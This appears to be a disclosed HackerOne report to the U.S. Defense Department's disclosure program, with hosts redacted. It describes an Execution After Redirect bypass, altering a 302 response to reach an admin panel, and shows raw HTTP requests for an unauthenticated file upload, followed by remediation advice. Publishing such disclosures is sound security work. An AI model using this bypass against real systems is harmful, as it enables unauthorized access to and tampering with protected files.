{
  "id": 1394910,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzk0OTEw",
  "url": "https://hackerone.com/reports/1394910",
  "title": "Unauthenticated Access to Admin Panel Functions at https://██████████/████████",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2021-11-08T21:24:16.535Z",
  "submitted_at": "2021-11-08T21:24:16.560Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "palaziv",
    "url": "/palaziv",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/3qqqmf4szognjgdr74j9fneri1e8/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%228681088.png%22%3B%20filename%2A%3DUTF-8%27%278681088.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T141920Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=8b2d7f54ab2c0efa0133f3f8e7cf896f54f8b0605e6f17af7e24f8759e4d9977"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 16064,
    "url": "https://hackerone.com/deptofdefense",
    "handle": "deptofdefense",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "U.S. Dept Of Defense",
      "twitter_handle": "DC3VDP",
      "website": "https://bit.ly/3ntULtN",
      "about": ""
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2021-11-29T22:11:25.600Z",
  "bug_reporter_agreed_on_going_public_at": "2021-11-17T17:00:03.511Z",
  "team_member_agreed_on_going_public_at": "2021-11-29T22:11:25.474Z",
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Description:**\nI discovered that the admin panel at https://████/█████ and all its functions can be accessed without authentication.\n\n## Impact\n\nAn attacker is able to use the administrative functions in order to upload, delete or modify files.\n\n## System Host(s)\n████████\n\n## Affected Product(s) and Version(s)\n██████'s ████████ (███) Management\n\n## CVE Numbers\n\n\n## Steps to Reproduce\n* Navigate to https://█████/ and click on the \"█████████\" button\n* Notice how the application first sends an HTTP POST request to https://█████████/█████ which gets answered with a redirect to https://█████/█████ which again redirects to https://███████/█████████\n* Looking at the response to https://█████████/███████ I noticed that even though the server sent back a 302 status code with a header `Location: /█████` the response was quite long\n* I browsed to https://████████/████, intercepted the response in Burp, changed the status code from `302 Found` to `200 OK` and was presented with the admin panel (this kind of attack is called [Execution after Redirect](https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR))). Below you can see the unmodified response containing links to the ███ Admin Functions:\n\n```\nHTTP/1.1 302 Found\nDate: Mon, 08 Nov 2021 20:28:44 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nCache-Control: no-store, no-cache, must-revalidate\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nLocation: /███████\nPragma: no-cache\nX-Vcap-Request-Id: f4014a06-51c2-44c3-4e4f-6db613c30484\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nContent-Length: 4260\n\n\n<table align=\"center\" width=\"800\" border=\"1\" cellspacing=\"1\"\n\tcellpadding=\"1\" bgcolor=\"#008000\">\n\t<tr>\n\t\t<td style=\"color: #FFF\" ;=\"\" align=\"center\">LIMITED DISTRIBUTION<br> <font\n\t\t\tsize=\"2px\">Distribution authorized to DoD, IAW 10 U.S.C. &#167&#167\n\t\t\t\t130 &amp; 455. Release authorized to U.S. DoD contractors, IAW 48\n\t\t\t\tC.F.R. &#167 252.245-7000. <br>Refer other requests to:\n\t\t\t\tHeadquarters, █████████, ATTN: Release Officer, █████████\n\t\t\t\t████████. <br>Destroy IAW DoDD 5030.59.\n\t\t\t\tRemoval of this caveat is prohibited.\n\t\t</font></td>\n\t</tr>\n</table>\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\n<html lang='en' xmlns=\"http://www.w3.org/1999/xhtml\">\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n<title>Admin</title>\n<script src=\"../███████p/SpryAssets/SpryMenuBar.js\" type=\"text/javascript\"></script>\n<link href=\"../█████████p/SpryAssets/SpryMenuBarHorizontal.css\"\n\trel=\"stylesheet\" type=\"text/css\" />\n</head>\n\n<body>\n\t<table align=\"center\" bgcolor=\"#82F379\" border=\"3\">\n\t\t<tr>\n\t\t\t<td colspan=\"2\" align=\"center\"><img\n\t\t\t\tsrc=\"../██████p/images/███_banner_top.jpg\" /></td>\n\t\t</tr>\n\t\t<tr>\n\t\t\t<td align=\"center\"><br />\n            ████ You are on NIPR NET RESTRICTIVE<br /></td>\n\t\t</tr>\n\t\t<tr>\n\t\t\t<td>\n\t\t\t\t<div align=\"center\">\n\t\t\t\t\t<ul id=\"MenuBar1\" class=\"MenuBarHorizontal\">\n\t\t\t\t\t\t<li><a class=\"MenuBarItemSubmenu\" href=\"#\">Home</a></li>\n\t\t\t\t\t\t<li><a class=\"MenuBarItemSubmenu\" href=\"#\">███████ Admin Functions</a>\n\t\t\t\t\t\t\t<ul>\n\t\t\t\t\t\t\t\t<li><a href=\"s3html.php\">UpLoad Weekly</a></li>\n\t\t\t\t\t\t\t\t<li><a href=\"../████p/████████/verifyfile.php\">Verify File Dates</a></li>\n\t\t\t\t\t\t\t\t<li><a href=\"#\">Add Single File</a>\n\t\t\t\t\t\t\t\t\t<ul>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../████p/███/addnewfile.php\" target=\"new\">VDU ADD\n\t\t\t\t\t\t\t\t\t\t</a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../████p/████████/addvpf.php\" target=\"new\">VPF ADD</a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../███████p/████████/████████class.php\" target=\"new\">Change\n\t\t\t\t\t\t\t\t\t\t\t\tClassification</a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../██████████p/██████/███████████████\">New █████</a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../████p/████/██████loadgraph.php\" target=\"new\">Graphic\n\t\t\t\t\t\t\t\t\t\t\t\tADD</a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../███p/██████/████delgrp.php\">Delete 'ALL' Graphic\n\t\t\t\t\t\t\t\t\t\t\t\tFiles</a></li>\n\t\t\t\t\t\t\t\t\t</ul></li>\n\t\t\t\t\t\t\t\t<li><a href=\"#\">Upload New Editions</a>\n\t\t\t\t\t\t\t\t\t<ul>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../███p/█████/██████████loadvdu.php\" target=\"new\">Install\n\t\t\t\t\t\t\t\t\t\t\t\tNew Base VDU </a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../█████p/█████/████████loadvpf.php\" target=\"new\">Install\n\t\t\t\t\t\t\t\t\t\t\t\tNew base VPF </a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../█████████p/███/█████████loadtxt.php\" target=\"new\">Install/Update\n\t\t\t\t\t\t\t\t\t\t\t\t██████##.txt</a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../█████p/██████████/████newgraph.php\" target=\"new\">Replace\n\t\t\t\t\t\t\t\t\t\t\t\tall Graphic Files</a></li>\n\t\t\t\t\t\t\t\t\t</ul></li>\n\t\t\t\t\t\t\t\t<li><a href=\"#\">Modify Single File**</a>\n\t\t\t\t\t\t\t\t\t<ul>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../████████p/█████████/███mod.php\">Modify ██████ Chart</a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../████p/██████████/██████████vitem.php\">Modify Library Specific\n\t\t\t\t\t\t\t\t\t\t\t\tFile</a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../███p/██████████/█████viteml.php\">Stop ALL VPFS from\n\t\t\t\t\t\t\t\t\t\t\t\tbeing viewed from specific Region</a></li>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../███p/██████/██████████graphic.php\">Modify Graphic\n\t\t\t\t\t\t\t\t\t\t\t\tSpecific File</a></li>\n\t\t\t\t\t\t\t\t\t</ul></li>\n\t\t\t\t\t\t\t\t<li><a href=\"../█████████p/████/██████████vpfdel.php\">DELETE VPF, VDU,\n\t\t\t\t\t\t\t\t\t\tGraphics</a></li>\n\t\t\t\t\t\t\t\t<li><a href=\"#\">Change Status of Deleted and New Records</a>\n\t\t\t\t\t\t\t\t\t<ul>\n\t\t\t\t\t\t\t\t\t\t<li><a href=\"../██████████p/███/█████deldel.php\">Change Record Status\n\t\t\t\t\t\t\t\t\t\t\t\tTo an ADDed or DELeted VDU Record</a></li>\n\t\t\t\t\t\t\t\t\t</ul></li>\n\t\t\t\t\t\t\t\t<li><a href=\"../█████████p/█████/████████_documentation.php\">██████████\n\t\t\t\t\t\t\t\t\t\tDocumentation</a></li>\n\t\t\t\t\t\t\t</ul></li>\n\t\t\t\t\t\t<li><a href=\"dssLogout.php\">Logout</a></li>\n\t\t\t\t\t</ul>\n\t\t\t\t</div>\n\t\t\t\t<p>&nbsp;</p>\n\t\t\t\t<p>&nbsp;</p>\n\t\t\t\t<p>\n\t\t\t\t\t<br /> <br />\n\t\t\t\t</p>\n\t\t\t</td>\n\t\t</tr>\n\t\t<tr>\n\t\t\t<td><br /> <br /></td>\n\t\t</tr>\n\t\t<tr align=\"center\">\n\t\t</tr>\n\t</table>\n\t<script type=\"text/javascript\">\n    var MenuBar1 = new Spry.Widget.MenuBar(\"MenuBar1\", {imgDown:\"../SpryAssets/SpryMenuBarDownHover.gif\", imgRight:\"../SpryAssets/SpryMenuBarRightHover.gif\"});\n</script>\n</body>\n</html>\n\n```\n\n* The functions allow to upload, modify and to delete ████ files and can all be used completely unauthenticated. Following an example in which I upload a file; this upload function can be accessed from https://███/elist/s3html.php. Note that the request has no session cookie:\n\n```\nPOST /██████████ HTTP/1.1\nHost: ███\nContent-Length: 899\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: https://█████\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryT4r0MDX8IcQqr8D9\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: https://██████████/elist/s3html.php\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nConnection: close\n\n------WebKitFormBoundaryT4r0MDX8IcQqr8D9\nContent-Disposition: form-data; name=\"nNtM\"\n\n13/37\n------WebKitFormBoundaryT4r0MDX8IcQqr8D9\nContent-Disposition: form-data; name=\"oNtM\"\n\n13/37\n------WebKitFormBoundaryT4r0MDX8IcQqr8D9\nContent-Disposition: form-data; name=\"update\"\n\n2021-11-08\n------WebKitFormBoundaryT4r0MDX8IcQqr8D9\nContent-Disposition: form-data; name=\"nxtdate\"\n\n2021-12-06\n------WebKitFormBoundaryT4r0MDX8IcQqr8D9\nContent-Disposition: form-data; name=\"regionSelect\"\n\n01\n------WebKitFormBoundaryT4r0MDX8IcQqr8D9\nContent-Disposition: form-data; name=\"type\"\n\nwindows\n------WebKitFormBoundaryT4r0MDX8IcQqr8D9\nContent-Disposition: form-data; name=\"userfile1[]\"; filename=\"test.txt\"\nContent-Type: text/plain\n\ntest\n\n------WebKitFormBoundaryT4r0MDX8IcQqr8D9\nContent-Disposition: form-data; name=\"buttonm\"\n\nBegin Uploads\n------WebKitFormBoundaryT4r0MDX8IcQqr8D9--\n\n```\n\nResponse:\n\n```\nHTTP/1.1 302 Found\nDate: Mon, 08 Nov 2021 21:03:35 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nCache-Control: no-store, no-cache, must-revalidate\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nLocation: 404.html\nPragma: no-cache\nSet-Cookie: JSESSIONID=0g33q2a5b6hkj02pv9hro94dqa; path=/; HttpOnly\nSet-Cookie: __VCAP_ID__=7aa1d3ae-4d04-4a15-6476-fac8; Path=/; HttpOnly; Secure\nX-Vcap-Request-Id: c7bd3c85-075f-43d3-4a45-7f494a6cc748\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nSet-Cookie: TS01485890=01d8bb34a4a839126a96d80bd04820274929fd7bd07f6a640cdcbc306946f3965158fe2cdee1ce628fee6943b7320cf7b62b158749; Path=/\nContent-Length: 337\n\n<br> path is /███████<br> get outtest.txt<br>S3 keyname: ██████████p/█████████test.txt<br>i = 0, Upload SUCCESS!<br>S3 ObjectURL: https://███████/████p/███████████████test.txt<br>error in ██████charts table \n```\n\n## Suggested Mitigation/Remediation Actions\nImplement proper access controls.\n\nMitigation for the Execution after Redirect vulnerability: Proper termination should be performed after redirects. In a function a return should be performed. In other instances functions such as die() should be performed. This will tell the application to terminate regardless of if the page is redirected or not.\n\n",
  "weakness": {
    "id": 26,
    "name": "Improper Access Control - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 41,
  "voters": [
    "raindeaf",
    "palaziv",
    "dnelsaka",
    "nightm4re",
    "akashhamal0x01",
    "jafar1",
    "0xwise",
    "official_blackhat13",
    "gazelem",
    "juanny213",
    "and 31 more..."
  ],
  "severity": {
    "rating": "critical",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
